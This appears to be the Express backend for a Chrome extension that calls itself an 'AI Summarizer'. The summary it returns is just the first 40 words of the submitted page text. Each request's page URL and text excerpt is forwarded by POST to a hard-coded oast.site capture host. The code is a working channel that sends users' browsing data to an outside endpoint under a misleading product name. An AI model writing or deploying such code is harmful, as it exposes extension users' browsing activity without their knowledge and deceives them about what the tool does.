const express = require("express");
const cors = require("cors");

const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;

// 🔗 RequestBin / oast.site URL
const REQUESTBIN_URL = "https://e0d7c31dc92cbb020b21g1589neyyyyyb.oast.site";

/* ---------------- HOME PAGE ---------------- */
app.get("/", (req, res) => {
  res.send("AI Summarizer Backend is Running (RequestBin Mode) ✅");
});

/* ---------------- SUMMARIZE API ---------------- */
app.post("/summarize", async (req, res) => {
  const { content, url } = req.body;

  if (!content) {
    return res.status(400).json({ error: "No content received" });
  }

  // simple summary (40 words)
  const summary = content
    .split(" ")
    .slice(0, 40)
    .join(" ") + "...";

  const payload = {
    tool: "AI Summarizer Chrome Extension",
    pageUrl: url,
    summary,
    time: new Date().toISOString()
  };

  try {
    // Forward data to RequestBin
    await fetch(REQUESTBIN_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    console.log("Data sent to RequestBin");

    res.json({ summary });
  } catch (err) {
    console.error("RequestBin error:", err);
    res.status(500).json({ error: "Failed to send to RequestBin" });
  }
});

/* ---------------- START SERVER ---------------- */
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
